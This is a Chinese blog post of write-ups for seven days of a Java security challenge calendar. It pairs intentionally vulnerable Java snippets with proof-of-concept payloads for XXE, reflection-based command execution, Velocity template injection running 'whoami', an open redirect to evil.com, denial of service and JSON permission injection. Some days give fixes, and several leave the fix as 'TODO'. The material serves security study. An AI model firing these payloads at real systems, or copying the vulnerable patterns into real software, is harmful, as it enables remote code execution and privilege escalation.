<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>JavaSecCalendar2019-Writeup学习 | Trace Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Day 1 - Candy CaneSource:1234567891011121314151617181920212223242526272829303132import org.jdom2.Content;import org.jdom2.Document;import org.jdom2.JDOMException;import org.jdom2.input.SAXBuilder;publ">
<meta property="og:type" content="article">
<meta property="og:title" content="JavaSecCalendar2019-Writeup学习">
<meta property="og:url" content="http://yoursite.com/2020/01/05/JavaSecCalendar2019-Writeup/index.html">
<meta property="og:site_name" content="Trace Blog">
<meta property="og:description" content="Day 1 - Candy CaneSource:1234567891011121314151617181920212223242526272829303132import org.jdom2.Content;import org.jdom2.Document;import org.jdom2.JDOMException;import org.jdom2.input.SAXBuilder;publ">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2020-03-20T01:38:48.720Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="JavaSecCalendar2019-Writeup学习">
<meta name="twitter:description" content="Day 1 - Candy CaneSource:1234567891011121314151617181920212223242526272829303132import org.jdom2.Content;import org.jdom2.Document;import org.jdom2.JDOMException;import org.jdom2.input.SAXBuilder;publ">
  
    <link rel="alternate" href="/atom.xml" title="Trace Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Trace Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-JavaSecCalendar2019-Writeup" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/05/JavaSecCalendar2019-Writeup/" class="article-date">
  <time datetime="2020-01-05T10:27:35.000Z" itemprop="datePublished">2020-01-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      JavaSecCalendar2019-Writeup学习
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Day-1-Candy-Cane"><a href="#Day-1-Candy-Cane" class="headerlink" title="Day 1 - Candy Cane"></a>Day 1 - Candy Cane</h2><h3 id="Source"><a href="#Source" class="headerlink" title="Source:"></a>Source:</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.jdom2.Content;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.Document;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.JDOMException;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.input.SAXBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ImportDocument</span> </span>&#123;</span><br><span class="line">  <span class="comment">// This function extracts the text of an OpenOffice document</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">extractString</span><span class="params">()</span> <span class="keyword">throws</span> IOException, JDOMException </span>&#123;</span><br><span class="line">    File initialFile = <span class="keyword">new</span> File(<span class="string">"uploaded_office_doc.odt"</span>);</span><br><span class="line">    InputStream in = <span class="keyword">new</span> FileInputStream(initialFile);</span><br><span class="line">    <span class="keyword">final</span> ZipInputStream zis = <span class="keyword">new</span> ZipInputStream(in);</span><br><span class="line">    ZipEntry entry;</span><br><span class="line">    List&lt;Content&gt; content = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((entry = zis.getNextEntry()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (entry.getName().equals(<span class="string">"content.xml"</span>)) &#123;</span><br><span class="line">        <span class="keyword">final</span> SAXBuilder sax = <span class="keyword">new</span> org.jdom2.input.SAXBuilder();</span><br><span class="line">        sax.setFeature(<span class="string">"http://javax.xml.XMLConstants/feature/secure-processing"</span>,<span class="keyword">true</span>);</span><br><span class="line">        Document doc = sax.build(zis);</span><br><span class="line">        content = doc.getContent();</span><br><span class="line">        zis.close();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">if</span> (content != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span>(Content item : content)&#123;</span><br><span class="line">        sb.append(item.getValue());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="POC-content-xml"><a href="#POC-content-xml" class="headerlink" title="POC content.xml"></a>POC content.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE doc [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:8888/test" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">doc</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">doc</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>将context.xml采用zip压缩为uploaded_office_doc.odt，放置于同目录下。</p>
<h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SAXBuilder builder = <span class="keyword">new</span> SAXBuilder();</span><br><span class="line">builder.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>,<span class="keyword">true</span>);</span><br><span class="line">builder.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">Document doc = builder.build(<span class="keyword">new</span> File(fileName));</span><br></pre></td></tr></table></figure>
<h2 id="Day-2-Eggnog-Madness"><a href="#Day-2-Eggnog-Madness" class="headerlink" title="Day 2 - Eggnog Madness"></a>Day 2 - Eggnog Madness</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.json.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainController</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> String[] parseJsonAsArray(String rawJson, String field) &#123;</span><br><span class="line">    JSONObject obj = <span class="keyword">new</span> JSONObject(rawJson);</span><br><span class="line">    JSONArray arrJson = obj.getJSONArray(field);</span><br><span class="line">    String[] arr = <span class="keyword">new</span> String[arrJson.length()];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arrJson.length(); i++) &#123;</span><br><span class="line">      arr[i] = arrJson.getString(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">parseJsonAsString</span><span class="params">(String rawJson, String field)</span> </span>&#123;</span><br><span class="line">    JSONObject obj = <span class="keyword">new</span> JSONObject(rawJson);</span><br><span class="line">    <span class="keyword">return</span> obj.getString(field);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// rawJson is user-controlled.</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">MainController</span><span class="params">(String rawJson)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(parseJsonAsString(rawJson, <span class="string">"controller"</span>), parseJsonAsString(rawJson, <span class="string">"task"</span>), parseJsonAsArray(rawJson, <span class="string">"data"</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">MainController</span><span class="params">(String controllerName, String task, String... data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Object controller = !controllerName.equals(<span class="string">"MainController"</span>) ? Class.forName(controllerName).getConstructor(String[].class).newInstance((Object) data) : <span class="keyword">this</span>;</span><br><span class="line">      System.out.println(controller.getClass().getMethod(task));</span><br><span class="line">      controller.getClass().getMethod(task).invoke(controller);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        String log = <span class="string">"# [ERROR] Exception with data: "</span> + data + <span class="string">" with exception "</span> + e1;</span><br><span class="line">        System.err.println(log);</span><br><span class="line">        <span class="comment">// DONE: VulnApp Security Bug #23517: Strip all "dots" so file extension does not lead to RCE</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"java"</span>, <span class="string">"-jar"</span>, <span class="string">"log4j_custom_dlogger.jar"</span>, log.replaceAll(<span class="string">"."</span>, <span class="string">""</span>)&#125;);</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> VulnApp Bug #24630: Logging is currently not working in v1.8,</span></span><br><span class="line">        <span class="comment">//       something with an ArgumentException, please have alook at that @peter</span></span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">        System.err.println(<span class="string">"FATAL ERROR: "</span> + e2);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>POC<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MainController MC = <span class="keyword">new</span> MainController(<span class="string">"&#123;\"controller\":\"java.lang.ProcessBuilder\",\"task\":\"start\",\"data\":[\"ls\"]&#125;"</span>);</span><br></pre></td></tr></table></figure></p>
<h3 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施:"></a>防御措施:</h3><p>TODO</p>
<h2 id="Day-3-Christmas-Carols"><a href="#Day-3-Christmas-Carols" class="headerlink" title="Day 3 - Christmas Carols"></a>Day 3 - Christmas Carols</h2><h3 id="Source-1"><a href="#Source-1" class="headerlink" title="Source:"></a>Source:</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.app.VelocityEngine;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplateRenderer</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">1915463532411657451L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                         HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        VelocityEngine velocity;</span><br><span class="line">        velocity = <span class="keyword">new</span> VelocityEngine();</span><br><span class="line">        velocity.init();</span><br><span class="line">        Map&lt;String, Object&gt; hm = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">        hm.put(<span class="string">"user"</span>, request.getParameter(<span class="string">"user"</span>));</span><br><span class="line">        String template = request.getParameter(<span class="string">"temp"</span>);</span><br><span class="line">        VelocityContext context =  <span class="keyword">new</span> VelocityContext(hm);</span><br><span class="line">        StringWriter tempWriter = <span class="keyword">new</span> StringWriter(template.length());</span><br><span class="line">        velocity.evaluate(context, tempWriter, <span class="string">"renderFragment"</span>, template);</span><br><span class="line">        String rendered = tempWriter.toString();</span><br><span class="line">        response.getWriter().println(rendered);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                          HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">//Do some other work</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>我把代码稍微修改了一下。很典型的velocity模版注入,rips给的poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poc1</span><br><span class="line">user=&amp;temp=#set($s=&quot;&quot;)#set($stringClass=$s.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch hacked.jsp&quot;))$stringClass</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">带回显的poc2</span><br><span class="line">#set($x=&apos;&apos;)</span><br><span class="line">#set($rt=$x.class.forName(&apos;java.lang.Runtime&apos;))</span><br><span class="line">#set($chr=$x.class.forName(&apos;java.lang.Character&apos;))</span><br><span class="line">#set($str=$x.class.forName(&apos;java.lang.String&apos;))</span><br><span class="line">#set($ex=$rt.getRuntime().exec(&apos;whoami&apos;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">    $str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
<h3 id="防御措施-2"><a href="#防御措施-2" class="headerlink" title="防御措施:"></a>防御措施:</h3><p>TODO</p>
<h2 id="Day-4-Father-Christmas"><a href="#Day-4-Father-Christmas" class="headerlink" title="Day 4 - Father Christmas"></a>Day 4 - Father Christmas</h2><h3 id="Source-2"><a href="#Source-2" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Login</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                        HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">    String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">    <span class="comment">//only relative urls are allowed!</span></span><br><span class="line">    <span class="keyword">if</span> (url.startsWith(<span class="string">"/"</span>)) &#123;</span><br><span class="line">      response.sendRedirect(url);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于是使用response.sendRedirect，其最终是通过http头location进行跳转，所以只能造成重定向问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.com/index.jsp?url=/evil.com</span><br></pre></td></tr></table></figure></p>
<h2 id="Day-5-Wintertime"><a href="#Day-5-Wintertime" class="headerlink" title="Day 5 - Wintertime"></a>Day 5 - Wintertime</h2><h3 id="Source-3"><a href="#Source-3" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.util.Enumeration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Request</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toString</span><span class="params">(HttpServletRequest req)</span> </span>&#123;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    String delimiter = req.getParameter(<span class="string">"delim"</span>);</span><br><span class="line">    Enumeration&lt;String&gt; names = req.getParameterNames();</span><br><span class="line">    <span class="keyword">while</span> (names.hasMoreElements()) &#123;</span><br><span class="line">      String name = names.nextElement();</span><br><span class="line">      <span class="keyword">if</span> (!name.equals(<span class="string">"delim"</span>)) &#123;</span><br><span class="line">        sb.append(<span class="string">"&lt;b&gt;"</span> + name + <span class="string">"&lt;/b&gt;:&lt;br&gt;"</span>);</span><br><span class="line">        String[] values = req.getParameterValues(name);</span><br><span class="line">        <span class="keyword">for</span> (String val : values) &#123;</span><br><span class="line">          sb.append(val);</span><br><span class="line">          sb.append(delimiter);</span><br><span class="line">          sb.append(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Tomcat默认限制post数据为2m，但是如果我们在url中，使用大量参数和字符，那么sb这个变量会变得非常大。因为StringBuilder的默认容量为16,每次append数据前会检查是否足够存放，如果不够，容量将会变为(oldcapacity*2)+2。因此如果我们提交恶意数据，很有可能造成内存不够，把java虚拟机搞挂。</p>
<h3 id="防御措施-3"><a href="#防御措施-3" class="headerlink" title="防御措施:"></a>防御措施:</h3><p>不要随便向StringBuilder里append东西。</p>
<h2 id="Day-6-Yule"><a href="#Day-6-Yule" class="headerlink" title="Day 6 - Yule"></a>Day 6 - Yule</h2><h3 id="Source-4"><a href="#Source-4" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReadFile</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                        HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">      String data = <span class="keyword">new</span> String(Files.readAllBytes(Paths.get(url)));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">      PrintWriter out = response.getWriter();</span><br><span class="line">      out.print(<span class="string">"File not found"</span>);</span><br><span class="line">      out.flush();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//proceed with code</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显的任意文件读取，不过这里还存在里一个问题，如果去读取/dev/urandom这类文件，因为是readAllBytes，而且不存在IO异常，就会把内存吃完，会造成dos.</p>
<h2 id="Day-7-Jingle-Bells"><a href="#Day-7-Jingle-Bells" class="headerlink" title="Day 7 - Jingle Bells"></a>Day 7 - Jingle Bells</h2><h3 id="Source-5"><a href="#Source-5" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApiCache</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                        HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    storeJson(request, <span class="string">"/tmp/getUserInformation.json"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                       HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">    loadJson();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadJson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="comment">// Deserialize to an HashMap object with Jackson's JsonParser and read the first 2 entries of the file.</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">storeJson</span><span class="params">(HttpServletRequest request, String filename)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    JsonFactory jsonobject = <span class="keyword">new</span> JsonFactory();</span><br><span class="line">    JsonGenerator jGenerator = jfactory.createGenerator(<span class="keyword">new</span> File(filename), JsonEncoding.UTF8);</span><br><span class="line">    jGenerator.writeStartObject();</span><br><span class="line">    jGenerator.writeFieldName(<span class="string">"username"</span>);</span><br><span class="line">    jGenerator.writeRawValue(<span class="string">"\""</span> + request.getParameter(<span class="string">"username"</span>) + <span class="string">"\""</span>);</span><br><span class="line">    jGenerator.writeFieldName(<span class="string">"permission"</span>);</span><br><span class="line">    jGenerator.writeRawValue(<span class="string">"\"none\""</span>);</span><br><span class="line">    jGenerator.writeEndObject();</span><br><span class="line">    jGenerator.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显的拼接造成的json注入,例如一个简单的poc:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=foo","permission":"all</span><br></pre></td></tr></table></figure></p>
<h3 id="防御措施："><a href="#防御措施：" class="headerlink" title="防御措施："></a>防御措施：</h3><p>对关键字符进行转义，例如”转义为\”.</p>
